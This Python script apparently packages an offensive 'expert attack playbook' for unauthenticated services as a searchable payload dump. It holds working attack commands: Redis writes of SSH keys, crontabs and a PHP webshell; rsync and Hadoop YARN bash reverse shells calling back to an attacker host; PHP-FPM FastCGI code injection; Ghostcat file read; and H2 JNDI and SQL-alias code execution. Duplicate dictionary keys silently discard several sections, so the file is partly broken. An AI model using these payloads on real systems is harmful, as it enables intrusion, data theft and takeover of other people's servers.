#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/unauthorized-access-common-services

Skill: SKILL: Unauthorized Access to Common Services — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-unauthorized-access-common-services.py --help
      python hack-skills-unauthorized-access-common-services.py --list
      python hack-skills-unauthorized-access-common-services.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/unauthorized-access-common-services'
TITLE = 'SKILL: Unauthorized Access to Common Services — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: unauthorized-access-common-services", "description: >-", "Unauthorized access playbook for common exposed services. Use when Redis, Rsync, PHP-FPM, AJP/Ghostcat, Hadoop YARN, H2 Console, or similar management interfaces are exposed without authentication."],
    'skill-unauthorized-access-to-common-services-expert-attack-playbook': [],
    '0-related-routing': ["- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when these services are reachable via SSRF (e.g., SSRF \u2192 Redis)", "- [jndi-injection](../jndi-injection/SKILL.md) when H2 Console or similar accepts JNDI connection strings", "- [deserialization-insecure](../deserialization-insecure/SKILL.md) when RMI Registry or T3 protocol is exposed", "- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for layer 2/3 attacks during service enumeration", "- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for shell payloads after gaining command execution"],
    'comprehensive-port-reference': ["Also load [PORT_SERVICE_MATRIX.md](./PORT_SERVICE_MATRIX.md) when you need:", "- Full exploitation matrix organized by port number (20+ services)", "- Enumeration, brute force, and post-exploitation per service", "- Quick triage during nmap/masscan output analysis"],
    '1-discovery-port-scanning': ["```bash", "nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET"],
    'key-ports': [],
    '6379-redis': [],
    '873-rsync': [],
    '9000-php-fpm-fastcgi': [],
    '8009-ajp-tomcat-ghostcat': [],
    '8088-hadoop-yarn-resourcemanager': [],
    '8082-h2-console-or-embedded-in-spring-boot': [],
    '1099-java-rmi-registry': [],
    '9200-elasticsearch': [],
    '5984-couchdb': [],
    '2375-docker-api': [],
    '27017-mongodb': [],
    '11211-memcached': [],
    '2-redis-port-6379': [],
    'detection': ["```bash", "redis-cli -h TARGET ping"],
    'response-pong-unauthenticated-access-confirmed': ["redis-cli -h TARGET INFO server"],
    'returns-redis-version-os-config': [],
    'write-ssh-authorized-keys': ["```bash"],
    'generate-key-pair': ["ssh-keygen -t rsa -f redis_rsa"],
    'write-public-key-to-redis-then-dump-to-authorized-keys': ["cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key", "redis-cli -h TARGET config set dir /root/.ssh", "redis-cli -h TARGET config set dbfilename authorized_keys", "redis-cli -h TARGET save"],
    'connect': ["ssh -i redis_rsa root@TARGET"],
    'write-crontab-reverse-shell': ["```bash", "redis-cli -h TARGET"],
    'write-webshell': ["```bash", "redis-cli -h TARGET"],
    'access-http-target-shell-php-cmd-id': [],
    'master-slave-replication-rce': ["Use `redis-rogue-server` to exploit master-slave replication for loading malicious `.so` module:", "```bash", "python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER"],
    'loads-module-via-slaveof-module-load-system-exec': [],
    'hardening': ["requirepass STRONG_PASSWORD", "bind 127.0.0.1", "protected-mode yes", "rename-command CONFIG \"\"", "rename-command FLUSHALL \"\""],
    '3-rsync-port-873': [],
    'detection': ["```bash", "rsync TARGET::"],
    'lists-available-modules-shares-if-anonymous-access-allowed': ["rsync -av TARGET::MODULE_NAME /tmp/loot/"],
    'download-entire-module-contents': [],
    'exploitation-write-crontab': ["```bash"],
    'create-reverse-shell-cron': ["echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron"],
    'upload-to-target-s-crontab-if-writable-module-maps-to-etc-or-similar': ["rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor"],
    'hardening': [],
    'etc-rsyncd-conf': ["auth users = rsync_user", "secrets file = /etc/rsyncd.secrets", "list = no", "hosts allow = 10.0.0.0/8", "read only = yes"],
    '4-php-fpm-fastcgi-port-9000': [],
    'mechanism': ["PHP-FPM listens for FastCGI requests. If exposed to the network (instead of Unix socket), an attacker can send crafted FastCGI packets to execute arbitrary PHP code."],
    'exploitation': ["```bash"],
    'using-fcgi-exp-or-similar-tool': ["python3 fpm.py TARGET 9000 /var/www/html/index.php -c \"<?php system('id'); ?>\""],
    'key-parameters-in-fastcgi-request': [],
    'script-filename-path-to-any-existing-php-file': [],
    'php-value-auto-prepend-file-php-input-injects-post-body-as-php-code': [],
    'php-admin-value-allow-url-include-on': [],
    'key-fastcgi-environment-variables-for-exploitation': ["```text", "SCRIPT_FILENAME = /var/www/html/index.php   # must point to an existing .php file", "PHP_VALUE = auto_prepend_file = php://input  # injects POST body as PHP code", "PHP_ADMIN_VALUE = allow_url_include = On     # enables remote inclusion"],
    'via-ssrf-gopher': ["gopher://TARGET:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00..."],
    'encoded-fastcgi-packet': [],
    'tool-gopherus-generates-the-gopher-url': ["python3 gopherus.py --exploit fastcgi"],
    'hardening': ["```ini", "; php-fpm.conf \u2014 bind to socket only:", "listen = /var/run/php-fpm.sock", "; If TCP required, restrict:", "listen.allowed_clients = 127.0.0.1"],
    '5-ghostcat-ajp-port-8009-cve-2020-1938': [],
    'mechanism': ["Apache JServ Protocol (AJP) is used between reverse proxy and Tomcat. AJP trusts all incoming data \u2014 an attacker connecting directly can set `javax.servlet.include.request_uri` to read arbitrary files from the webapp directory."],
    'file-read': ["```bash"],
    'using-ajpshooter-or-similar': ["python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read"],
    'reads-any-file-within-the-webapp-root': [],
    'web-inf-web-xml-deployment-descriptor': [],
    'web-inf-classes-class-compiled-java-classes': [],
    'web-inf-lib-jar-library-jars': [],
    'file-include-rce': ["If a file upload exists (e.g., uploaded JSP disguised as image), AJP can include it as JSP:", "```bash", "python3 ajpShooter.py TARGET 8009 /uploaded_avatar.txt eval"],
    'if-the-file-contains-jsp-code-it-gets-executed': [],
    'hardening': ["```xml", "<!-- server.xml \u2014 disable AJP or add secret: -->", "<Connector port=\"8009\" protocol=\"AJP/1.3\" secretRequired=\"true\" secret=\"STRONG_SECRET\"/>", "<!-- Or remove the AJP connector entirely -->"],
    '6-hadoop-yarn-resourcemanager-port-8088': [],
    'detection': ["```bash", "curl http://TARGET:8088/cluster"],
    'if-accessible-unauthenticated-yarn-resourcemanager-ui': [],
    'rce-via-application-submission': ["```bash"],
    'submit-a-mapreduce-application-that-executes-a-command': ["curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application"],
    'returns-application-id-application-xxx-0001': ["curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \\", "-H \"Content-Type: application/json\" \\", "-d '{", "\"application-id\": \"application_xxx_0001\",", "\"application-name\": \"test\",", "\"am-container-spec\": {", "\"commands\": {\"command\": \"/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"}", "\"application-type\": \"YARN\""],
    'hardening': ["Enable Kerberos authentication; restrict network access to management ports."],
    '7-h2-database-console': [],
    'detection': ["H2 Console is often enabled in Spring Boot apps via:", "spring.h2.console.enabled=true", "spring.h2.console.settings.web-allow-others=true", "Access: `http://TARGET:PORT/h2-console`"],
    'jndi-injection-via-connection-string': ["In the H2 Console login form, the JDBC URL field accepts JNDI.", "**BeanFactory + EL bypass** (works on Java 8u252+):", "```text"],
    'jdbc-url-in-login-form': ["javax.naming.InitialContext"],
    'ldap-response-attributes': ["javaClassName: javax.el.ELProcessor", "javaFactory: org.apache.naming.factory.BeanFactory", "forceString: x=eval", "x: Runtime.getRuntime().exec(\"id\")", "Also see [jndi-injection](../jndi-injection/SKILL.md) for the full JNDI/BeanFactory exploitation flow."],
    'rce-via-runscript': ["```sql", "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return \"ok\"; }';", "CALL EXEC('id');"],
    '8-quick-reference': ["```text"],
    'redis-check-auth': ["redis-cli -h TARGET ping"],
    'redis-write-webshell': ["SET x \"<?php system($_GET['c']);?>\"", "CONFIG SET dir /var/www/html/", "CONFIG SET dbfilename shell.php"],
    'rsync-list-modules': ["rsync TARGET::"],
    'ghostcat-read-web-xml': ["python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read"],
    'yarn-submit-rce-job': ["curl -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application"],
    'h2-rce-via-alias': ["CREATE ALIAS EXEC AS '...Runtime.exec...'; CALL EXEC('id');"],
    '9-reverse-proxy-misconfiguration': [],
    'nginx-off-by-slash-path-traversal': ["```nginx"],
    'vulnerable-configuration': ["location /static {", "alias /var/www/static/;"],
    'access-static-etc-passwd-resolves-to-var-www-etc-passwd': [],
    'the-missing-trailing-slash-on-location-causes-path-traversal': [],
    'fix-location-static-with-trailing-slash-matching-alias': [],
    'nginx-missing-root-location': ["```nginx"],
    'if-no-root-location-defined-and-alias-is-used': [],
    'attacker-may-access-nginx-conf-or-other-server-files': ["GET /..%2f..%2fetc/nginx/nginx.conf HTTP/1.1"],
    'x-forwarded-for-x-real-ip-trust': [],
    'if-backend-trusts-these-headers-for-ip-based-auth': ["GET /admin HTTP/1.1", "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1", "True-Client-IP: 127.0.0.1"],
    'may-bypass-ip-whitelist-for-admin-panels': [],
    'caddy-template-injection': [],
    'caddy-with-templates-enabled': [],
    'if-user-input-reaches-caddy-template-rendering': ["{{.Req.Host}}          \u2192 Information disclosure", "{{readFile \"/etc/passwd\"}}  \u2192 Local file read via Go template"],
    'this-is-essentially-a-go-template-injection-through-proxy-config': [],
    'useful-tools': ["- `yandex/gixy` \u2014 Nginx configuration analyzer", "- `Raelize/Kyubi` \u2014 Reverse proxy misconfiguration scanner", "- `GerbenJavado/bypass-url-parser` \u2014 URL parser confusion tester"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()